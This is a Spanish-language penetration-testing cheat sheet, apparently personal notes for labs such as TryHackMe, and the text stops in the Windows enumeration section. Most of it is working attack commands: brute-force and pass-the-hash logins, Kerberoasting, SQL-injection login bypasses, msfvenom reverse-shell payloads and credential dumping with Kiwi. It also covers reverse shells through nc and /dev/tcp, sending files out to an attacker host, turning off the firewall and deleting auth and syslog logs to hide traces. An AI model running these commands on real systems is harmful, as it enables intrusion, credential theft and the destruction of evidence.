# Descubrimiento de hosts
```Bash
fping -a -g 192.168.0.0/24 #Escaneo ping mostrando solo ip activas
nmap -sn 192.168.0.0/24 #Escaneo ping
nmap -Pn 192.168.0.0/24 #Escaneo sin ping
nmap -sU 192.168.0.0/24 #Escaneo UDP
arp-scan -I eth0 --localnet #Escaneo ARP
arp -a #Listar tabla ARP Windows
netdiscover -r 192.168.0.0/24 #Escaner de red
dnsrecon -d example.com -D subdomains.txt -t brt #Descubrimiento subdominios
masscan 443 192.168.0.0/24 #Escaner puerto de toda una red
```

## **Ping Sweep Linux**
```Bash
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes" & done
```

## **Ping Sweep Windows**
### **CMD**
```Powershell
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.2.%i | find "TTL=" >nul && (echo 192.168.2.%i : True) || (echo 192.168.2.%i : False)
```

### **Powershell**  
```Powershell
1..254 | ForEach-Object {
    $ip = "192.168.2.$_"
    $result = Test-Connection -ComputerName $ip -Count 1 -Quiet
    "$ip : $result"
}
```

## **IP Routing (Acceder a otra IP a la que no tengamos accesibilidad)**

```Bash
Route #Para ver las redes a las que tenemos acceso
ip route # Igual que route pero con una salida mas moderna
ip route add #IP descubierta" via "gateway" 
```

# Resolución DNS
## **Nslookup**
```Bash
nslookup -type=SRV _ldap._tcp.domain.com 10.10.193.144
nslookup <ip>
nslookup <domain>
nslookup <domain_name> <DNS_server_IP> #Consulta servidor especifico
nslookup example.com 8.8.8.8
nslookup
set type=MX "A,AAAA,NS,TXT,CNAME,SOA" #Seleccionar el tipo de registro DNS
set debug #Muestra información de depuración
set timeout=5 #Cambia el tiempo de espera
set retry=3 #Especifica los intenros de resolver una consulta
set port=4444 #Cambia el puerto al cual realiza la consulta
server 8.8.8.8 #Cambia el servidor al que estas conectado
```

## **Dig**
```Bash
dig @10.10.193.144 _ldap._tcp.domain.com SRV
dig -x <ip> #Obtener nombre de dominio asociado (consulta inversa)
dig <domain>
dig <domain> MX #Consulta registros especificos
dig <domain> NS
dig <domain> @<DNS_server_IP> #Consulta servidor Dns
dig example.com @8.8.8.8
```

## **Ipconfig DNS**
```Bash
ipconfig /displaydns #Cache Dns
```

## **Host**
```Bash
host <ip>
host <domain>
```

# Nmap

## **Escaneo rapido de todos los puertos** 

```Bash
nmap -sCV -p- "IP" -oN escaneo_completo.txt
```

- -sCV: Es un conjunto del comando -sC y -sV.
- -p-: Indica que haga un escaneo a los 65535.
- -oN: Indica que el resultado que muestre Nmap por consola lo almacene en el archivo escaneo_completo.txt

## **Escaneo completo de Nmap**
```Bash
nmap -A -sS -p- --open --min-rate 5000 -vvv -n -Pn  10.10.187.146 -oN Escaneo.txt
```

## **Comprobación de vulnerabilidades con Nmap**

```Bash
nmap "--script=servicio*" -p"puerto del servicio" "IP"
Ej: nmap --script=ftp-* -p21 "IP" 
```

# Revision escaneo
Para resivar el escaneo usaremos una expresion regular con el comando `grep`
```
grep '^[0,9]' <file>
grep '[0,9]$' <file>
grep '[0,9]*' <file>
```

- `^`: Muestra solo las lineas las cuales empiezan por un numero del siguiente fichero
- `$`: Muestra todas las lineas que terminen con un numero
- `*`: Muestra unicamente los numeros

```
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
```

- **`cut -d '/' -f1`**:
    - `cut` es una herramienta que corta secciones de cada línea de un archivo.
    - `-d '/'` especifica que el delimitador de campo es el carácter `/`.
    - `-f1` indica que se debe tomar el primer campo.
    - **Resultado:** De las líneas que comienzan con un número, toma el texto antes del primer `/`.
- **`|`**:
    - La tubería pasa la salida del comando anterior al siguiente comando.
- **`sort -u`**:
    - `sort` es una herramienta que ordena líneas de texto.
    - `-u` (único) elimina las líneas duplicadas.
    - **Resultado:** Ordena alfabéticamente las líneas resultantes y elimina las duplicadas.
- **`xargs`** toma la salida del comando anterior (que son líneas separadas) y las convierte en una única línea de texto, con los elementos separados por espacios.
- **`tr ' ' ','`**:
	- `tr` (translate) es una herramienta que traduce o reemplaza caracteres.
	- `' '` (espacio) indica el carácter a ser reemplazado.
	- `','` indica el carácter de reemplazo.

## **Escaneo final**
```
nmap -p135,139,22,25,445,49665,49670,80 -SC -SV 10.0.2.43,45,46,53,55 -Pn -oN Full_scan.txt
```

# SSH
```Bash
ssh <user>@<IP> #Acceso por ssh
ssh <user>@<IP> 'sc.exe start service' #Ejecutar comando desde ssh
scp ./payload.exe <user>@<IP>:"C:/payload.exe" #Transferir fichero
```

# Active Directory

## **Crackmapexec**
```Bash
crackmapexec smb 192.168.0.0/24 #Listar equipos disponibles de windows
crackmapexec smb 192.168.0.50 #Detectar dominios y hosts
crackmapexec smb 192.168.0.50 -u 'user' -p 'passwd' #Validar usuario
crackmapexec smb 192.168.0.50 -u 'user' -p 'passwd' --shares #Listar recursos
crackmapexec winrm 192.168.0.50 -u 'user' -p 'passwd' #Validar uso de Winrm
crackmapexec smb 192.168.0.50 -u 'user' -p /diccionario #Brute force
crackmapexec smb <IP/domain> -u 'user' -p 'password' --rid-brute #Brute force RID
```

## **Evil-Winrm**
```Bash
evil-winrm -i <IP> -u 'user' -p 'passwd'
evil-winrm -i <IP> -H <hash> #Pass-the-Hash
evil-winrm -i <IP> -s <path_to_pem> #Conexión con certificado
evil-winrm -i <IP> -u 'user' -p 'passwd' -d <file> -o <file> #Descargar fichero
evil-winrm -i <IP>-u 'user' -p 'passwd' -u <file> -t <file> #Subir fichero
#Comandos dentro de evil-winrm
upload
dowload
```
- `-d`: Especifica fichero sistema remoto
- `-o`: Especifica ruta de destino del fichero
- `-u`: Especifica ruta local del sistema
- `-t`: Especifica la ruta del sistema de destino

##  **Smbclient**
```Bash
smbclient -L <IP> -N #Comprobación de NULL SESSIONS
smbclient -L <IP> #Listar directorios
smbclient \\\\$ip\\recurso -U user%password #Acceder a recurso compartido
smbclient //$ip/recurso -U user%password #Acceder a recurso compartido
prompt #Desactiva las preguntas
mget * #Descarga todos los archivos de una carpeta
```

- `-L`: Mostrar por consola los recursos compartidos.
- `-N`: Listar recursos con sesión null

## **Smbmap**
```Bash
smbmap -H <IP> #Enumerar recursos compartidos
smbmap -H <IP> -u 'user' -p 'passwd' #Especificar usuario
smbmap -H <IP> -u 'user' -H <hash> #Pass-the-Hash
smbmap -H <IP> -x <comando> #Ejecutar comando
smbmap -H <IP> -R <recurso> -A <archivo> -q #Descarga archivo
smbmap -H <IP> -R <recurso> -u 'user' -p 'passwd' --upload <mi_arhcivo> <archivo_subir> #Subir archivo 
```
- `-H`: Enumerar recursos compartidos

## **Smbpasswd**
```Bash
smbpasswd -r <IP> -U user
smbpasswd -r <IP> -U user -D 5
impacket-smbpasswd user@IP
```
- `D`: Modo debugger

## **Enum4linux**
```
enum4linux "IP"
```

## **Rpcclient**
```Bash
rpcclient -U "" -N [IP] #Conexion remota
srvinfo #Informacion SO
enumdomusers #Enumeración usuarios
enumdomgroups #Enumeración grupos
```

## **Telnet**
```Bash
telnet <IP> <port>
#Para abrir telent Ctrl+AltGr+]
quit #Salir de telnet
```

## **Xfreerdp**
```Bash
xfreerdp /u:administrator /p:qwertyuiop /cert:ignore /v:10.2.28.248:3333
```

## **Rdesktop**
```
rdesktop <IP>
```

## **Winexe**
```Bash
winexe -U 'admin%password' //<IP> cmd.exe #Acceder con credenciales
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.32.61 cmd.exe #Acceder con Hash completo
```

## **Psexec**
```Bash
psexec.py Administrator@10.2.30.5
python3 psexec.py administrator:'MEGACORP_4dm1n!!'@10.129.29.151
```

## **Responder**
```
responder -I eth0
```

## **Kerberos**
### **Kerbrute**
```Bash
./kerbrute userenum --dc 10.10.116.29 -d lab.enterprise.thm /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt
```
- Enumerar usuarios desde kerberos

### **GetNPUsers**
```Bash
GetNPUsers.py domain/user -no-pass #Obtener hash sin credenciales
```

### **GetUserSPNs**
```Bash
GetUserSPNs.py domain/user:password -dc-ip 10.10.116.29 -request #Obtener SPN
GetUserSPNs.py -dc-ip 10.10.25.146 domain/user -hashes <hash LM>:<hash NTLM> #Identificar usuarios SPN
GetUserSPNs.py -dc-ip 10.10.25.146 raz0rblack.thm/lvetrova -hashes <hash LM>:<hash NTLM> -request #Obtener SPN con hash
```

## **Bloodhound y Neo4j**
```Bash
sudo neo4j console #Inicar neo4j
bloodhound # Iniciar GUI Bloodhound
bloodhound-python -u svc-admin -p management2005 -ns 10.10.193.144 -d spookysec.local -c all #Extraer información del sistema y dominio
```

## **Herramientas impacket**
```Bash
sudo apt-get install python3-impacket
ls -la /opt/impacket
ls -la /usr/share/doc/python3-impacket/examples/
```

## **Ejecutar comandos Windows en Linux**
```Bash
wmic -U <dominio/usuario>%<contraseña> //ip_del_objetivo "cmd.exe /c <comando>"
```

## **Comprobación de vulnerabilidades de SMB**
```
nmap --script=smb-vuln* -p139,445 "ip"
```

## **RPC 111,2049**
### **Rpcbind**
```Bash
rpcinfo #Consultar servicios RPC
showmount -e <IP> #Lista todos los servicios RPC y sus puertos
nmap -sV -p 111 <IP> #Identificar servicios y versiones RPC
rpclient
```

### **NFS**
```Bash
nfsstat #Muestra estadisticas sobre el cliente y servidor NFS
mount -t nfs 10.10.92.58:/users /mnt/razorblack/ #Montar un recurso compartido en local
exportfs -v #Muestra todas las exportaciones activas
nfswatch #Monitorizar el trafico de red NFS
auxiliary/scanner/nfs/nfsmount #Identificar recursos NFS
nmap --script=nfs* -p 111,2049 <IP>
```

### **SMB/CIFS**
```
sudo mount -t cifs //IP_del_servidor/nombre_de_la_comparticion /mnt/Share -o username=usuario,password=contraseña
```


# DNS
```Bash
dig <IP>
dnsenum <IP>
DNSRecon <IP>
```

# Enumeración y explotación de aplicaciones web

## **Análisis de aplicaciones web**
1. Revisa toda la página y el código fuente.
2. Lee cada página, revisa posibles emails, usuarios, información, etc.
3. Una vez encontrada la versión del sistema, busca en Google información acerca del servicio, busca exploits, CVEs, cualquier información que te permita determinar si la versión es vulnerable.
4. Utiliza whatweb o Wappalyzer para encontrar información sobre la aplicación web.
5. Realiza descubrimiento de directorios y de archivos.

## **Comandos linux web**
### **Whatweb**
```Bash
whatweb [IP]
```

### **Curl**
```Bash
curl -i -X OPTIONS http://cyberlens.thm
```

- -i: Incluye la cabecera en la respuesta
- -X: Especifica la solicitud HTTP que se envia

## **Fuzzing web**

### **Gobuster**

#### **Descubrimiento de directorios**
```
gobuster dir -u "ip" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

- -u: Este argumento indica la IP/URL a analizar.
- -w: Este argumento indica el directorio donde se encuentra el diccionario.
- -t: Este argumento indica los hilos a los que se va a hacer el descubrimiento. Mientras más hilos, más ruido creas en la red y menos preciso es el escaneo.

### **Descubrimiento de archivos con extensiones**

```
gobuster dir -u "ip" -w /usr/share/wordlists/dirb/common.txt -t 30 -x txt,php,js,html,sh,py,sql,zip,bak
```

- `-u`: Este argumento indica la IP/URL a analizar.
- `-w`: Este argumento indica el directorio donde se encuentra el diccionario.
- `-t`: Este argumento indica los hilos a los que se va a hacer el descubrimiento. Mientras más hilos, más ruido creas en la red y menos preciso es el escaneo.
- `-x`: Este argumento indica las extensiones que se quieren analizar.

### **Descubrimiento de subdominios**
```
gobuster vhost --append-domain -u https://creative.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k -t 40
```

- `vhost`: Especifica que el escaneo se realizará en modo virtual host, lo que significa que `gobuster` intentará enumerar subdominios utilizando la técnica de "Host: header".
- `--append-domain`: Añade el dominio especificado (`http://creative.thm/`) al final de cada subdominio en la lista proporcionada, facilitando la construcción completa del subdominio que será probado.
-  `-k`: Esta opción indica  que ignore los errores de certificado SSL/TLS, lo cual es útil si el sitio utiliza HTTPS con un certificado auto-firmado o no válido.

```
gobuster dns -d example.com -w /ruta_diccionario/subdomains-top1million-110000.txt
```

- `dns`: Indica que el modo de escaneo será para DNS, es decir, `gobuster` intentará enumerar subdominios consultando registros DNS.
- `-d example.com`: Especifica el dominio que se va a escanear. En este caso, el dominio es `example.com`.

## **Dirsearch**
### **Escanear url ocultas y ficheros**
```Bash
dirsearch -u http://url -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e php,html,js
```

## **Dirb**
```Bash
dirb http://url
dirb http://ip
```

## **Wfuzz**
### **Buscar directorios ocultos**
```Bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://url/FUZZ
```

- -c: Solo muestra las respuestas exitosas
- --hc 404: Las salidas con codigo 404 saldran en oculto y no se mostraran con el filto de -c
- -t 200: Establece el tiempo maximo de espera por solicitud en milisegundo
- -w: Especifica la ruta del fichero con la lista de palabras

### **Ataque fuerza bruta con wfuzz**
```Bash
wfuzz -c --hc 404 -t 200 -w names.txt -d 'username=FUZZ&password=la_que_sea' http://10.10.10.97/login.php
```

- -d: Especifica los datos que se enviaran al cuerpo de HTTP POST

## **Escaneo de vulnerabilidades web**

### **Wpscan**
#### **Escaneo plugins, usuarios y vulnerabilidades**
```Bash
wpscan --url https://dominio.com/wordpress -e u vt vp
```

- -e u: Realiza un escaneo de usuario
- -vt: Activa el modo verboso y realiza un escaneo mas preciso y rapido

#### **Escaneo vulnerabilidades y plugins**
```Bash
wpscan --url https://dominio.com/wordpress -e vp
```

- -vp: Escanea los plugins y las vulnerabilidades de la web
#### **Ataque fuerza bruta usuarios**
```Bash
sudo wpscan --url 192.168.1.10/wordpress -e u U <user> -P /home/kali/Documentos/diccionario
```

- -U: Selecciona la lista de usuarios a realizar el ataque
- -P: Selecciona la lista de palabras para hacer el ataque de fuerza bruta

#### **Escaner avanzado con token**
```Bash
wspcan --url https://wordpress.org --api-token <token>
```

# Metasploit
## **Comandos** 
```
search
type:auxiliary
name:ftp
platform: windows
cve:2017
```

## **Sesiones**
```
sessions
sessions -u 4 -i <ID>
```

## **Modulos**
```
multi/handle
multi/manage/shell_to_meterpreter
multi/manage/autoroute
```

## **Rutas**
```
route
route add <IP RED> <ID>
route del <IP RED> <ID>
run autorute -s <IP RED>
```

## **Portforwarding**
```
portfwd
portfwd add -l <port local> -p <port victima> -r <IP victima>
portfwd del -l <port local> -p <port victima> -r <IP victima>
```

## **Msfvenom**
```Bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu dirección IP> LPORT=4444 -f exe > payload.exe
msfvenom --list payloads
msfvenom --list payloads | grep linux
msfvenom --list payloads | grep windows
```

## **Kiwi**
```Bash
load wiki #Cargar kiwi
creds_all #Cargar credenciales sistema
lsa_dump_sam #Obtener hash ususarios
lsa_dump_secret #Obtener credenciales secretas
```


# BBDD

## **SQL Injection**
### **Bypass de autenticación con una condición siempre verdadera**
```Mysql
User: ' OR '1'='1
Passwd: ' OR '1'='1
```

### **Inyección para anular la validación de la contraseña**
```Mysql
User: admin' --
Passwd: Campo vacio
```

### **Inyección de múltiples líneas**
```Mysql
User: admin') OR ('1'='1
Passwd: Campo vacio
```

### **Inyección para extraer la primera tabla en bases de datos MySQL (basada en error)**
```Mysql
User: ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --
Passwd: Campo vacio
```

### **Inyección para enumerar usuarios**
```Mysql
User: ' UNION SELECT null, username FROM users --
Passwd: Campo vacio
```

## **Inyección SQL automática**

```Bash
sqlmap -u <url>
sqlmap -u <url> -p <parámetro> --dbs
sqlmap -u <url> --tables
sqlmap -u <url> -D <nombre de la BBDD> -T <Nombre de la tabla> --dump
sqlmap -u <url> --fresh-queries # Refrescar datos
sqlmap -u <url> --dump-all --dbs --random-agent 
```

- `-D <database>`: Este parámetro se utiliza para especificar el nombre de la base de datos 
- `-T <table>`: Este parámetro se utiliza para especificar el nombre de una tabla dentro de la base de datos seleccionada (`-D`)
- - `--dbs`: Este parámetro indica que debe enumerar las bases de datos disponibles en el servidor de base de datos objetivo.
- `--tables`: Este parámetro enumera todas las tablas disponibles dentro de la base de datos seleccionada (`-D`). 
- `--dump-all`: Este parámetro indica que debe intentar extraer todos los datos de las bases de datos que descubre durante la exploración, intentará recuperar tablas, columnas y datos de todas las bases de datos accesibles.
- `--fresh-queries`: Este parámetro indica que realice nuevas consultas para cada solicitud que envíe
- `--random-agent`: Este parámetro le indica que debe usar un agente de usuario (user-agent) aleatorio en las solicitudes HTTP que envía. 
- `-v 3` (o `--verbose=3`): Este parámetro establece el nivel de verbosidad del registro de `sqlmap`. En este caso, `3` indica un nivel alto de verbosidad

## **Comandos básicos para MySQL**

```Bash
mysql --user=root --port=13306 -p -h "ip"
mysql -u <user> -p
```

- -p: Este argumento indica la solicitud de una contraseña al iniciar sesión.
- -h: Este argumento indica el host al que se quiere conectar.

```Mysql
> SHOW databases;
> SHOW tables FROM "nombre de la bbdd";
> USE "nombre de la bbdd";
> SELECT * FROM table;
> SELECT * FROM mysql.user WHERE User = 'dev' \G #Listar datos de forma vertical
```

# Fuerza bruta con Hydra

Es posible que en algún momento necesites hacer un ataque de fuerza bruta a un servicio, como ssh, FTP, etc.

```Bash
hydra -L usuarios.txt -P contraseña.txt "ip" ssh -s 22
hydra -L usuarios.txt -P contraseña.txt telnet://"ip"
hydra -L usernames.txt -P rockyou.txt <IP> -s <port> -f http-post-form "/administrator:username=^USER^&password=^PASS^:Invalid username or password"
hydra -L users.txt -p 'Th1s_1s_4_v3ry_s3cur3_p4ssw0rd' ssh://10.10.162.52 #Password spray
hydra -L usuarios.txt -P rockyou.txt 10.10.242.126 http-post-form "/login:username=^USER^&password=^PASS^:The user '^USER^' does not exist"
#Utiliza el mismo ususario en la parte del error
hydra -L usuarios.txt -P rockyou.txt 10.10.242.126 http-post-form "/login:username=^USER^&password=^PASS^:The user '.*' does not exist"
#Utiliza cualquier valor
```

- -L: Indica el archivo donde se encuentran los posibles usuarios.
- -P: Indica el archivo donde se encuentran las posibles contraseñas.
- -s: Indica el puerto destino, en este caso al ser ssh, el puerto 22.

# Cracking y Hasehes
## **Password Cracking con John**
```Bash
john --format=[tipo_de_hash] [hash_file] --wordlist=[wordlist]
```

```Bash
john --wordlist /usr/share/rockyou.txt "hash.txt"
```

## **Password Cracking con Hascat**
```Bash
hashcat -m [tipo_de_hash] -a 0 [hash_file] [wordlist]
```


# Túneles SSH / Port forwarding

El port forwarding se utiliza para redirigir el tráfico de un puerto específico hacia otro desde la misma o una red distinta. Es decir, un túnel ssh nos permite acceder a un puerto que está activo en la máquina víctima.

Para conocer los puertos activos dentro de la máquina víctima utilizaremos el comando:
```
netsat -tuln
ss -tn
```

- -t: Muestra las conexiones TCP.
- -u: Muestra las conexiones UDP.
- -l: Muestra los puertos en modo escucha.
- -n: Muestra los números del puerto activo.

Para hacer el port forwarding, utilizaremos el siguiente comando:
```
ssh -L 4545:127.0.0.1:8888 user@"ip_víctima"
```

De esta manera, el puerto 4545 de la máquina víctima al cual no teníamos acceso, estará disponible en nuestra máquina en 127.0.0.1:8888

# Port forwarding con Chisel

## **Levantamos el servidor**
```
./chisel server -p <puerto> --reverse
```
- `./chisel server`: Especifica que se va a iniciar el servidor Chisel.
- `-p <puerto>`: Especifica el puerto en el cual el servidor Chisel va a escuchar. En el ejemplo, `8000` es el puerto utilizado.
- `--reverse`: Indica que el servidor va a esperar conexiones reversas de clientes Chisel. Esto significa que los clientes se conectarán al servidor para establecer un túnel hacia atrás.

## **Conectamos con cliente**
```
./chisel client <servidor>:<puerto> R:<puerto_local>:<direccion_destino>:<puerto_destino>
```
- `./chisel client`: Especifica que se va a iniciar el cliente Chisel.
- `<servidor>:<puerto>`: Especifica la dirección IP o nombre de dominio del servidor Chisel y el puerto en el cual el servidor está escuchando. En el ejemplo, `10.9.0.138:8000`.
- `R:<puerto_local>:<direccion_destino>:<puerto_destino>`: Define la redirección del tráfico.

### **Ejemplo Chisel**
```
./chisel server -p 8000 --reverse
```

```
./chisel client 10.9.0.138:8000 R:9001:127.0.0.1:9001
```

# Pivoting con Socat
Primero nos ponemos a la escucha con nuestra maquina
```
nc -nvlp 4444
```

Ahora creamos la conexión de la maquina intermediaria con socat por el puerto que estamos en escucha
```
socat TCP-L:4444,fork,reuseraddr TCP:<host-atacante>:4444
```
- `TCP-LISTEN:4444`: `socat` escucha en el puerto 4444.
- `reuseaddr`: Esta opción permite reutilizar la dirección del socket si está en uso por otro proceso.
- `fork`: Permite manejar múltiples conexiones entrantes.

# Pivoting con Ligolo
## **Crear y levantar interfaz de red**
```
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

## **Añadir ruta a tabla de enrutamiento**
```
sudo ip route add 10.10.10.0/24 dev ligolo
```

## **Ejecutar ligolo**
```
./proxy -selfcert
```

## **Conectarnos desde maquina Linux**
```
./agent -connect 192.168.0.14:11601 -ignore-cert
```

## **Conectarnos desde maquina Windows**
```
.\agent.exe -connect 192.168.0.14:11601 -ignore-cert
```

## **Portforwarding con Ligolo**
```
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

# Netcat
# **Escucha con netcat**
```Bash
rlwrap nc -nvlp 443
```

## **Descargar fichero con netcat**
### **Escucha desde nuestra maquina**
Nuestra maquina
```Bash
nc -lvp <4444> > <archivo>
```
###  **Transferencia Linux**
```
nc -w 3 <IP> <port> < <archivo>
```
### **Transferencia Windows**
```
nc.exe <IP> <PORT> < "C:\Program Files (x86)\Spoofer\firewall.vbs"
```

## **Shell con netcat**
```Bash
nc <IP> <PORT> -e /bin/bash
/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 #Ubunutu
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f #Cuando no sirve nc -e /bin/bash
```

## **Pivoting con netcat**
Deshabilitamos el cortafuegos
```
netsh advfirewall set allprofiles state off
```

Ahora desde la máquina Windows intermedia decimos que todo el tráfico que recibamos por  el puerto 4444 lo vamos a enviar al puerto 1234 de la máquina atacante:
```
nc.exe -l -p 4444 -e "nc 192.168.0.14 1234"
```

Ahora nos ponemos en escucha con netcat desde nuestra maquina victima
```
nc -nvlp 1234
```

Y en la maquina victima ejecutamos la shell con netcat por el puerto que este escuchando la maquina intermediaria
```
nc -c bash 10.10.10.3 4444
```

[[Pivoting con Windows y Netcat]]

# Binarios
```
/usr/share/windows-resources/binaries/
```

# TTY Interactiva
```Bash
script /dev/null -c bash
CNTRL+Z
stty raw -echo; fg
	reset
	xterm
export TERM=xterm
export SHELL=bash
stty rows 40 columns 123
```

# Obtención de shell copiando binario
```Bash
cp /bin/bash /dev/shm
chmod +x /dev/shm/bash
/dev/shm/bash -p
id
ps -p $$
```

# Transferencia de archivos
## **Levantar servidor Python**
### **Python2**
```Bash
python -m SimpleHTTPServer <port>
```
### **Python 3**
```Bash
python3 -m http.server <port>
```

## **Descarga de archivos**
### **Linux**
```Bash
wget http://<target>/<port>
```

### **Windows**
```Powershell
certutil -split -urlcache -f http://<target>/<archivo> <nombre_archivo>
```

```Powershell
wget http://192.168.0.14:80/nc.exe -OutFile C:\Users\Wolf\Downloads\nc.exe
```

```Powershell
curl http://10.9.0.118:4444/file -o <namefile>
```

```Powershell
Invoke-WebRequest -Uri http://192.168.0.14:80/nc.exe -OutFile C:\Users\Wolf\Downloads\nc.exe
```

## **Netcat**
### **Receptor**
```
nc -lvnp 1234 > file.txt
```

### **Emisor**
```
nc 10.9.0.205 1234 < file.txt
```

## **Servidor SMB**
### **Levantar servidor SMB**
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
smbserver kali .
```

### **Descarga Windows**
```Powershell
copy \\10.9.0.184\kali\reverse.exe reverse.exe
```

### **Descarga Linux**
```
smbclient //10.9.0.184/kali -c 'get reverse.exe'
```

## **Script servidor descarga archivos Windows**
```Python
import http.server
import socketserver

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        path = self.translate_path(self.path)
        with open(path, 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

PORT = 4444
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
    ```

Y ahora en la maquina windows victima ejecutamos el siguiente comando
```
Invoke-WebRequest -Uri "http://10.9.0.118:4444/firewall.vbs" -Method Put -InFile "C:\Program Files (x86)\Spoofer\firewall.vbs"
```

# Compilar codigo C# con Mono
```
mcs program.cs
```

# Post explotación
## **Enumeración Local Linux**
### **Información del sistema**
```bash
uname -a #Muestra información del sistema operativo y el kernel.
uname -m #Muestra la arquitectura del sistema
arch #Muestra la arquitectura del sistema
lsb_release -a #Muestra la version del sistema
uname -r #Muestra la versión del kernel
cat /etc/issue #Muestra la versión del sistema operativo.
cat /etc/*-release #Muestra información detallada del sistema operativo.
cat /etc/crontab #Enumera tareas programadas.
cat /etc/resolf.conf #Muestra información sobre DNS
ls -alh /home #Enumera usuarios y sus directorios home.
ps aux #Muestra procesos en ejecución.
netstat -antup #Muestra conexiones de red y procesos.
ifconfig -a #Muestra información de red.
ip a #Muestra información de las conexiones
df -h #Muestra espacio en disco.
mount #Muestra sistemas de archivos montados.
```

### **Usuarios y grupos**
```Bash
id #Muestra el ID de usuario y grupos.
sudo -l #Lista los privilegios sudo del usuario actual.
cat /etc/passwd #Enumera usuarios del sistema.
cat /etc/group #Enumera grupos del sistema.
cat /etc/sudoers #Enumera usuarios con privilegios sudo.
cat /etc/shadow  #Contiene contraseñas cifradas
```

### **Conexiones**
```Bash
ip a
ifconfig -a
ip link show #Mostrar lista interfaces
ip addr show eth0 #Mostrar estado interfaz
ethtool eth0 #Mostrar información interfaz
sudo ip link set eth0 up/down #Levantar interfaz
arp -a #Muestra la tabla ARP del sistema
route -n #Muestra la tabla de enrutamiento del sistem
ip route #Muestra la tabla de enrutamiento del sistema utilizando el comando IP
traceroute <IP> #Sigue la ruta de una dirección
```

### **Servicios y puertos**
```Bash
netstat -tuln #Muestra puertos en escucha.
netstat -tplug #Revisa que programa utiliza cada puerto
ss -tuln #Muestra servicios en escucha.
lsof -i #Lista de archivos abiertos y puertos de red.
nmap -sV -p- <ip #Escaneo de puertos con versión de servicio.
nc -vz <ip> <port #Verifica la conexión a un puerto específico.
ps aux #Muestra todos los procesos ejecutandose en el sistema en el momtento de ejecutarse
ps -p $$ #Muestra informacion del proceso actual del sistema
pspy64  #Herramineta similar a ps pero muestra los procesos en tiempo real
systemctl status #Ves estado del sistema
systemctl status nginx #Ves estado servicio
systemctl start/stop nginx #Iniciar/Parar servicio
systemctl restart nginx #Reinciar servicio
systemctl enable/disable nginx #Habilitar/Deshabilitar servicio
systemctl list-units --type=service --state=running #Ver servicios en ejecución
sudo systemctl reload nginx #Recargar configuración servició
systemctl list-units --type=mount #Ver puntos de montaje activos
systemctl list-units --type=device #Ver disposiitvos activos
systemctl --failed #Ver servicios fallidos
sudo systemctl reboot #Reiniciar sistema
sudo systemctl poweroff #Apagar sistema
```
[[Pspy64]]

### **Permisos y binarios**
```Bash
find / -perm -4000 2>/dev/null #Buscar archivos SUID o SGID
find / -perm -4000 -ls 2>/dev/null #Encontrar direcctorio y binarios
find / -type f -perm -4000 2>/dev/null #Encontrar solo binarios
find / -writable -type d 2>/dev/null#Encontrar directorios con permisos de escritura
find / -perm -u=s -type f 2>/dev/null #Busca binarios con permisos SUID.
find / -perm -g=s -type f 2>/dev/null #Busca binarios con permisos SGID.
find / -type f -name "*.sh" -exec ls -la {} \; #Enumera scripts con permisos de ejecución.
find / -type f -name "*.py" \( -perm -u=x -o -perm -g=x -o -perm -o=x \) 2>/dev/null #Enumera fichero .py ejecutables
find / -group user -type f 2>/dev/null #Enumera ficheros que tiene acceso el usuario
find / -type f -name "*.sh" -exec ls -l {} \; #Buscar scripts mal configurados
locate <archivo> #Buscar la ubicación del archvivo en el sistema
locate -i <archivo> #Para desactivar mayusculas y minusculas
sudo updatedb #Actualiza la base de datos que utiliza el comando locate
```

### **Eliminar huellas**
```Bash
history -c
rm -r /var/log/auth.log
rm -r /var/log/syslog
```

### **Binarios buscar vulnerabilidades**
[[1 - Linux Exploit Suggester]]
[[15 - Linux Smart Enumeration]]
[[19- LinPEAS]]


## **Enumeración Local Windows**
### **Información del sistema**
```Powershell
systeminfo #Muestra información detallada del sistema.
hostname #Muestra el nombre del equipo.
whoami #Muestra el usuario actual.
ipconfig /all #Lista toda la configuración de red
netsh wlan show profiles #Listar configuración de red
driverquery #Lista controladores instalados.
wmic os get osarchitecture #Muestra la arquitectura del sistema
wmic qfe list #Lista actualizaciones instaladas.
wmic qfe get Caption,Description,HotFixID,InstalledOn #Lista de parches instalados.
wmic process list full #Muestra detalles de procesos.
wmic startup list full #Lista de programas de inicio.
wmic logicaldisk get name,filesystem,freespace,size #Lista detalles del disco
```

### **Usuarios y grupos**
```Powershell
net users #Muestra los usuarios del sistema
net localgroups #Muestra los grupos del sistema
net localgroup administrators #Enumera los miembros del grupo Administradores.
net user <username> #Muestra información de un usuario específico.
net group <groupname> #Muestra información de un grupo específico.
net user /domain #Muestra los usuarios del dominio.
net group /domain# Muestra los grupos del dominio.
net user <username> /domain #Muestra información de usuario del dominio.
whoami /priv #Lista los permisos del usuario actual
```

### **Conexiones**
```Powershell
arp -a #Lista la cache ARP
route print #Lista las tablas de enrutamiento
tracert #Sigue la ruta de una dirección
ipconfig /displaydns #Lista la caché del resolver del DNS del sistema
netsh #Configurar interfaz de red
netsh advfirewall set allprofiles state off #Deshabilitar firewall
